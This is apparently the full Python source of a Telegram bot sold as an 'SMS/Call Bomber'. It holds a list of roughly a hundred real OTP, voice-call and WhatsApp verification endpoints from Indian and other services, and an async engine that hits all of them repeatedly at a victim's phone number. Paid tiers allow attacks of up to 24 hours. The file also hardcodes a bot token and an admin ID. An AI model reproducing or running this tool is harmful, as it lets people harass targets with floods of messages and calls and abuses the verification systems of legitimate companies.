import asyncio
import aiohttp
import logging
import json
import sqlite3
import random
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ==========================================
# ⚙️ CONFIGURATION & CREDENTIALS
# ==========================================
BOT_TOKEN = "8149989412:AAFTxPkIhLJDe2gaNQYVL2PIapLB3UQ"
ADMIN_ID = 5151408901
DB_NAME = "rgz_premium.db"
MAX_CONCURRENT_REQUESTS = 50  # Limits speed to prevent crashes

# 🎨 LOGGING SETUP
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==========================================
# 📦 PREMIUM PACKAGES
# ==========================================
PREMIUM_PACKAGES = {
    "10": {"days": 10, "price": "₹50", "name": "🔥 10 DAYS STORM"},
    "30": {"days": 30, "price": "₹150", "name": "⚡ 30 DAYS NUCLEAR"},
    "365": {"days": 365, "price": "₹500", "name": "☢️ 365 DAYS ATOMIC"}
}

NORMAL_DURATION = 2
PREMIUM_DURATION = 1440  # 24 Hours

# ==========================================
# 🚀 Modded By REvil Haxsor
# ==========================================

# 1. YOUR OLD PYTHON APIS (Preserved)
OLD_APIS = [
    {"name": "🔥 FreeFire Bomber", "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET"},
    {"name": "📞 Call Bomber API", "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET"},
    {"name": "💥 Bomberr API", "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET"},
    {"name": "👓 Lenskart BLAST", "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "🎵 Hungama ATTACK", "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "🚕 Meru Cab STRIKE", "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "data": lambda p, d: f"mobile_number={p}"},
    {"name": "🏢 NoBroker BOMB", "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "🚢 ShipRocket MISSILE", "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "📝 PenPencil STORM", "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "💊 1mg NUCLEAR", "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "🛒 KPN Fresh FIRE", "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "📞 Servetel BLAST", "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "data": lambda p, d: f"mobile_number={p}"},
    {"name": "🍔 Swiggy Call ATTACK", "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "🏦 Tata Capital STRIKE", "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "📚 Doubtnut MISSILE", "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "🚗 GoPink Cabs STORM", "url": lambda p, d: "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "data": lambda p, d: f"check_mobile_number=1&contact={p}"}
]

# 2. New apis Seattled By REvil Haxsor)
NEW_APIS = [
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "body": {"phone": "{no}", "isOtpViaCallAtLogin": "true"}},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "body": {"number": "{no}", "otp_on_call": True}},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "phone={no}&action=voice_otp"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "phone={no}&type=voice"},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "body": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{no}"}}},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "body": {"phoneCode": "+91", "telephone": "{no}"}},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "phone={no}&countryCode=IN"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Byjus SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un"}},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_number={no}"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "body": {"phone_number": "{no}", "language": "en"}},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{no}"}},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "body": {"mobile_number": "+91{no}"}},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "body": {"phone": "{no}", "city": 362}},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "body": {"mobileNumber": "{no}"}},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "body": {"phone": "{no}", "country": "in"}},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "body": {"mobile_number": "{no}", "resend_otp_request": True}},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "body": {"phone": "{no}", "email": "test@example.com"}},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "body": {"query": "mutation {SendOtp(input: {mobile: \"{no}\",isdCode: \"91\",otpType: \"registerOtp\"}) {status {message code}}}"}},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "body": {"phone": "{no}", "app_signature": "4pFtQJwcz6y"}},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "body": {"contact_no": "{no}"}},
    {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", "method": "POST", "body": {"phone_number": "91{no}"}},
    {"name": "Youla", "url": "https://youla.ru/web-api/auth/request_code", "method": "POST", "body": {"phone": "+91{no}"}},
    {"name": "Ivi", "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": {"phone": "91{no}"}},
    {"name": "ICQ", "url": "https://www.icq.com/smsreg/requestPhoneValidation.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": {"msisdn": "91{no}", "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}},
    {"name": "Redbus", "url": "https://m.redbus.in/api/getOtp?number={no}&cc=91&whatsAppOpted=false", "method": "GET"},
    {"name": "Newton", "url": "https://my.newtonschool.co:443/api/v1/user/otp/?registration=true", "method": "POST", "body": {"phone": "+91{no}"}},
    {"name": "JioMart", "url": "https://www.jiomart.com/mst/rest/v1/session/initiate/using_mobileno_n_otp?mobile_no={no}", "method": "GET"},
    {"name": "Meesho", "url": "https://www.meesho.com/api/v1/user/login/request-otp", "method": "POST", "body": {"phone_number": "{no}"}},
    {"name": "Tastes2Plate", "url": "https://webapi.tastes2plate.com/app/new-login", "method": "POST", "body": {"mobile": "{no}", "device_type": "web"}},
    {"name": "Tradgo", "url": "https://tradgo.in/appapi4/Forgot_password_new/getOtp", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Samsung", "url": "https://www.samsung.com/in/api/v1/sso/otp/init", "method": "POST", "body": {"user_id": "{no}"}},
    {"name": "Nykaa Fashion", "url": "https://www.nykaafashion.com/webscripts/api/otp/generate", "method": "POST", "body": {"customer_mobile": "{no}"}},
    {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "body": {"is_otp": 1, "mobile": "{no}", "is_password": 0}},
    {"name": "Shopsy", "url": "https://www.shopsy.in/api/1/action/view", "method": "POST", "body": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{no}", "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE"}}},
    {"name": "Royal Challengers", "url": "https://shop.royalchallengers.com/api/customer/login", "method": "POST", "body": {"utype": "Online", "mobile": "{no}"}},
    {"name": "Docon", "url": "https://docon.co.in/api/v1/user/online-login", "method": "POST", "body": {"mobileNumber": "{no}"}},
    {"name": "Dhurina", "url": "https://intapi.dhurina.net/api/send_otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Rappi", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "body": {"country_code": "+91", "phone": "{no}"}},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "body": {"mobile": "{no}", "locale": "IN"}},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "body": {"mobile": "{no}", "hash_type": "play_store"}},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "body": {"mobile": "{no}", "resend": True}},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "body": {"mobile": "{no}", "platform": "Android", "mode": "new_user"}},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "body": {"mobile": "{no}", "isd_code": "91"}},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "body": {"mobile": "{no}"}},
    {"name": "Snapdeal", "url": "https://m.snapdeal.com/sendOTP", "method": "POST", "body": {"purpose": "LOGIN_WITH_MOBILE_OTP", "mobileNumber": "{no}"}},
    {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "body": {"phoneNumber": "{no}", "templateName": "default", "channel": "sms", "flow": "SIGNIN"}},
    {"name": "Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true", "method": "POST", "body": {"country_code": "IN", "phone": "{no}", "otp_type": 1, "send_otp": True}},
    {"name": "Shemaroo", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_no=%2B91{no}"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobilenumber={no}&otptype=register"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "body": {"mobile": "{no}", "selectedCountryCode": "+91"}},
    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "body": {"phoneNumber": "{no}", "channel": "SMS"}},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Housing", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "body": {"phone": "{no}", "country_url_name": "in"}},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "body": {"phone": "{no}", "app_signature": "wk+avHrHZf2"}},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_number={no}&source=sms&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "body": {"phone": "{no}", "deviceName": "Android"}},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "body": {"phone": "{no}", "signupPlatform": "NATIVE_ANDROID"}},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "body": {"phone": "{no}", "emailId": "user@example.com"}},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "body": {"mobile_number": "{no}", "activity_type": "aakash-myadmission", "profile": "student"}},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "body": {"phone": "{no}", "deviceType": "website"}},
    {"name": "Dehaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "body": {"phone": "{no}", "client_id": "kisan-app"}},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "body": {"phone": "{no}", "signup": True}},
    {"name": "Spencers", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "PaymeIndia", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "body": {"phone": "{no}", "uniqueReferCode": "S10ePIIrbH3"}},
    {"name": "ShoppersStop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "body": {"phone": "{no}", "type": "SIGNIN_WITH_MOBILE"}},
    {"name": "Hyuga", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "body": {"signInMobile": "{no}", "channel": "sms"}},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "body": {"phone": "{no}", "mfa_channels": "phno"}},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Mamaearth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "body": {"phone": "{no}", "referralCode": ""}},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={no}", "method": "GET"},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "body": {"phone": "{no}"}},
    {"name": "TataMotors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "body": {"phone": "{no}", "reqBody": "sendOtp"}},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "body": {"phone": "{no}", "buildVersion": "24.0", "p": "android"}},
    {"name": "Stratzy", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "body": {"phoneNo": "{no}"}},
    {"name": "Eka Care", "url": "https://auth.eka.care/auth/init", "method": "POST", "body": {"payload": {"allowWhatsapp": True, "mobile": "+91{no}"}, "type": "mobile"}},
    {"name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "body": "mobile_number={no}"}
]

ALL_APIS = OLD_APIS + NEW_APIS

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(DB_NAME, check_same_thread=False)
        self.create_tables()

    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                premium_expiry DATETIME,
                total_attacks INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.commit()

    def add_user(self, user_id, username):
        cursor = self.conn.cursor()
        cursor.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (user_id, username))
        self.conn.commit()

    def set_premium(self, user_id, days):
        cursor = self.conn.cursor()
        expiry = datetime.now() + timedelta(days=days)
        cursor.execute('UPDATE users SET premium_expiry = ? WHERE user_id = ?', (expiry, user_id))
        self.conn.commit()
        return expiry

    def is_premium(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT premium_expiry FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        if result and result[0]:
            return datetime.fromisoformat(result[0]) > datetime.now()
        return False

# ==========================================
# 💣 BOMBER ENGINE
# ==========================================
class RGZBomber:
    def __init__(self):
        self.active_attacks = {}
        self.db = Database()
        self.user_states = {}
    
    def is_premium(self, user_id):
        return self.db.is_premium(user_id) or user_id == ADMIN_ID
    
    def get_max_duration(self, user_id):
        return PREMIUM_DURATION if self.is_premium(user_id) else NORMAL_DURATION

    # 🛠️ HELPER: PARSE NEW JSON APIs
    def _prepare_request(self, api, phone, duration):
        url = api["url"]
        method = api.get("method", "GET")
        headers = api.get("headers", {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
        data = None

        # Helper to replace placeholders
        def replace_placeholders(text, p):
            if isinstance(text, str):
                return text.replace("{no}", p).replace("{cc}", "91").replace("{mobile}", p)
            if isinstance(text, dict):
                return {k: replace_placeholders(v, p) for k, v in text.items()}
            return text

        # Handle Lambda (Old APIs)
        if callable(url):
            url = url(phone, duration)
        else:
            url = replace_placeholders(url, phone)

        # Handle Data/Body
        if "data" in api and callable(api["data"]):
            data = api["data"](phone, duration)
        elif "body" in api:
            data = replace_placeholders(api["body"], phone)
            # Ensure JSON header if body is dict
            if isinstance(data, dict):
                headers["Content-Type"] = "application/json"
        
        return url, method, headers, data

    async def start_bombing(self, user_id, phone, duration):
        if user_id in self.active_attacks:
            return "⚠️ 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠! /stop 𝐟𝐢𝐫𝐬𝐭."

        attack_id = f"atk_{int(time.time())}"
        self.active_attacks[user_id] = {
            "phone": phone,
            "running": True,
            "start_time": time.time(),
            "success": 0,
            "failed": 0,
            "id": attack_id
        }

        asyncio.create_task(self._bomb_worker(user_id, phone, duration))
        
        return f"""
╔═══✦❖ 🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ❖✦═══╗
  
🎯 𝐓𝐚𝐫𝐠𝐞𝐭: +91 {phone}
⏰ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐌𝐢𝐧𝐬
🔫 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {len(ALL_APIS)} 𝐀𝐏𝐈𝐬
💎 𝐌𝐨𝐝𝐞: {'𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ⚡' if self.is_premium(user_id) else '𝐅𝐑𝐄𝐄 🐢'}

⚠️ 𝐏𝐫𝐞𝐬𝐬 /stop 𝐭𝐨 𝐜𝐚𝐧𝐜𝐞𝐥
╚══════════════════════════════╝
"""

    async def stop_bombing(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            stats = self.active_attacks[user_id]
            del self.active_attacks[user_id]
            return f"🛑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n✅ 𝐒𝐞𝐧𝐭: {stats['success']} | ❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {stats['failed']}"
        return "⚠️ 𝐍𝐨 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤."

    async def _bomb_worker(self, user_id, phone, duration):
        end_time = time.time() + (duration * 60)
        semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS) # Limit concurrency

        async with aiohttp.ClientSession() as session:
            while user_id in self.active_attacks and self.active_attacks[user_id]["running"] and time.time() < end_time:
                tasks = []
                for api in ALL_APIS:
                    if not self.active_attacks[user_id]["running"]: break
                    
                    try:
                        url, method, headers, data = self._prepare_request(api, phone, duration)
                        tasks.append(self._send_safe_request(semaphore, session, url, method, headers, data, user_id))
                    except Exception as e:
                        print(f"Skipping API {api.get('name')}: {e}")

                await asyncio.gather(*tasks)
                await asyncio.sleep(1.5) # Anti-spam delay

        if user_id in self.active_attacks:
            del self.active_attacks[user_id]

    async def _send_safe_request(self, semaphore, session, url, method, headers, data, user_id):
        if user_id not in self.active_attacks: return

        async with semaphore:
            try:
                if method == "POST":
                    if isinstance(data, dict):
                        async with session.post(url, headers=headers, json=data, timeout=5) as resp:
                            success = resp.status in [200, 201]
                    else:
                        async with session.post(url, headers=headers, data=data, timeout=5) as resp:
                            success = resp.status in [200, 201]
                else:
                    async with session.get(url, headers=headers, timeout=5) as resp:
                        success = resp.status in [200, 201]

                if user_id in self.active_attacks:
                    if success: self.active_attacks[user_id]["success"] += 1
                    else: self.active_attacks[user_id]["failed"] += 1
            except:
                if user_id in self.active_attacks: self.active_attacks[user_id]["failed"] += 1

# ==========================================
# 🎮 BOT HANDLERS
# ==========================================
bomber = RGZBomber()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    bomber.db.add_user(user.id, user.username)
    
    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 𝐒𝐓𝐀𝐑𝐓 𝐀𝐓𝐓𝐀𝐂𝐊", callback_data="start_menu")],
        [InlineKeyboardButton("💎 𝐁𝐔𝐘 𝐏𝐑𝐄𝐌𝐈𝐔𝐌", callback_data="premium_menu")],
        [InlineKeyboardButton("👤 𝐌𝐘 𝐀𝐂𝐂𝐎𝐔𝐍𝐓", callback_data="account")]
    ])
    
    await update.message.reply_text(
        f"👋 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {user.first_name}!\n\n💣 𝐁𝐞𝐬𝐭 𝐒𝐌𝐒/𝐂𝐚𝐥𝐥 𝐁𝐨𝐦𝐛𝐞𝐫 𝟐𝟎𝟐𝟓\n🔥 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐰𝐢𝐭𝐡 𝟐𝟎𝟎+ 𝐀𝐏𝐈𝐬\n⚡ 𝐅𝐚𝐬𝐭𝐞𝐬𝐭 𝐒𝐩𝐞𝐞𝐝",
        reply_markup=markup
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    await query.answer()

    if data == "start_menu":
        btns = [
            [InlineKeyboardButton("𝟐 𝐌𝐢𝐧 (𝐅𝐫𝐞𝐞)", callback_data="bomb_2")],
            [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤", callback_data="main")]
        ]
        if bomber.is_premium(user_id):
            btns.insert(1, [InlineKeyboardButton("⚡ 𝟑𝟎 𝐌𝐢𝐧 (𝐕𝐈𝐏)", callback_data="bomb_30")])
            btns.insert(2, [InlineKeyboardButton("☢️ 𝟔𝟎 𝐌𝐢𝐧 (𝐕𝐈𝐏)", callback_data="bomb_60")])
        
        await query.edit_message_text("⏰ 𝐂𝐡𝐨𝐨𝐬𝐞 𝐀𝐭𝐭𝐚𝐜𝐤 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:", reply_markup=InlineKeyboardMarkup(btns))

    elif data.startswith("bomb_"):
        duration = int(data.split("_")[1])
        bomber.user_states[user_id] = {"duration": duration, "waiting": True}
        await query.edit_message_text(f"🎯 𝐒𝐞𝐧𝐝 𝐓𝐚𝐫𝐠𝐞𝐭 𝐍𝐮𝐦𝐛𝐞𝐫 (𝟏𝟎 𝐃𝐢𝐠𝐢𝐭𝐬)\n\n⚡ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐌𝐢𝐧𝐬")

    elif data == "main":
        await start(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id in bomber.user_states and bomber.user_states[user_id].get("waiting"):
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫! 𝐒𝐞𝐧𝐝 𝟏𝟎 𝐝𝐢𝐠𝐢𝐭𝐬.")
            return

        duration = bomber.user_states[user_id]["duration"]
        del bomber.user_states[user_id]
        
        msg = await bomber.start_bombing(user_id, text, duration)
        await update.message.reply_text(msg)

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await bomber.stop_bombing(update.effective_user.id)
    await update.message.reply_text(msg)

# ==========================================
# 🏁 MAIN EXECUTION
# ==========================================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🔥 RGZ PREMIUM BOMBER IS ONLINE...")
    app.run_polling()

if __name__ == "__main__":
    main()